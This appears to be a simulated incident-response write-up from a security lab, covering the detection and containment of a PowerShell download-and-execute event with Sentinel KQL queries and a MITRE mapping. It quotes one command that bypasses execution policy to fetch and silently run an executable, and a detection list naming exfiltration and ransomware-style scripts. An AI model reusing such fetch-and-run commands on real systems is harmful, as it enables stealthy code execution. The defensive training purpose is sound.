# Scenario 2 – PowerShell Web Request and Payload Execution

_A simulated incident response to unauthorized file download and execution via PowerShell, detected through Microsoft Sentinel and Microsoft Defender for Endpoint._

![Alt text](/imgs/powershellmap.png)
---

## 1. Preparation  
- **Objective:** Detect post-exploitation activity involving tools downloaded from the internet via PowerShell.  
- **Context:** Attackers often use built-in tools like `Invoke-WebRequest` to pull malware or scripts onto systems undetected.  
- **Detection Method:** A Microsoft Sentinel analytic rule was configured to trigger if PowerShell includes `Invoke-WebRequest`.  
- **Detection Query:**
  ```
  DeviceProcessEvents
  | where DeviceName == "windows-ado"
  | where FileName == "powershell.exe"
  | where ProcessCommandLine contains "Invoke-WebRequest"
  ```
## 2. Detection & Analysis
- **Alert Name:** PowerShell SuspiciousWebRequest - ADO
- **Affected Host:** windows-ado
- **Triggered By:** User labuser
- **Observed Command:**
    ```powershell
    cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait
    ```

- **User Statement:** Claimed they were installing free software and saw a brief black screen.
- **Initial Findings:** The binary was silently installed using PowerShell with no visible prompts.
- **Process Execution Verification:**
	```kql
    let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1","7z2408-x64.exe"]); 
	DeviceProcessEvents
	| where DeviceName == "windows-ado"
	| where FileName == "powershell.exe"
	| where ProcessCommandLine has "-File" and ProcessCommandLine has_any (ScriptNames)
	| order by TimeGenerated
	| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
    ```
- **Confirmed Executions:** Multiple suspicious scripts were launched by labuser.
- **Reverse Engineering Summary:**
    - portscan.ps1: Scans a range of IPs for open common ports and logs results.
    - Other scripts (e.g., pwncrypt, exfiltratedata) suspected of offensive behavior — passed to RE team.

## 3. MITRE ATT&CK Mapping
| Tactic | Technique | ID | Notes |
|--------|-----------|---|-------|
| Execution	| Command and Scripting Interpreter | T1059.001 | PowerShell used to invoke remote command |
| Ingress Tool | Ingress Tool Transfer | T1105 | External .exe pulled from remote blob storage |
| Initial Access | Exploitation for Client Execution | T1203 | Downloaded .exe silently executed |

## 4. Containment, Eradication & Recovery
- **Containment:**
    - Isolated windows-ado using Microsoft Defender for Endpoint.
    - Terminated PowerShell processes.
- **Eradication:**
    - Ran full antivirus scan on the host — returned clean.
    - Deleted downloaded .exe and any residual scripts.
- **Recovery:**
    - Restored network access after validation.
    - Monitored for reoccurrence of suspicious PowerShell use.

## 5. Post-Incident Activities
- **User Remediation:**
    - labuser was enrolled in additional cybersecurity awareness training.
    - Training materials upgraded using advanced KnowBe4 modules.
- **Policy Changes:**
    - PowerShell usage restricted via GPO/AppLocker for non-administrative accounts.
    - Alerting expanded for all downloads via Invoke-WebRequest.
- **Detection Enhancements:**
    - Deployed the Sentinel KQL rule as a permanent detection rule.
    - Enabled advanced PowerShell logging (ScriptBlockLogging, ModuleLogging).
    

## 6. Recommendations & Next Steps
- Block high-risk URLs and domains using firewall/Defender policies.
- Monitor for common PowerShell download patterns across all endpoints.
- Restrict internet access from non-administrative workstations.
- Establish a file reputation service to alert on unsigned executables.

> ![NOTE]
> These recommendations are illustrative and should be tailored to your organization’s specific environment, policies, and risk tolerance and technical environment.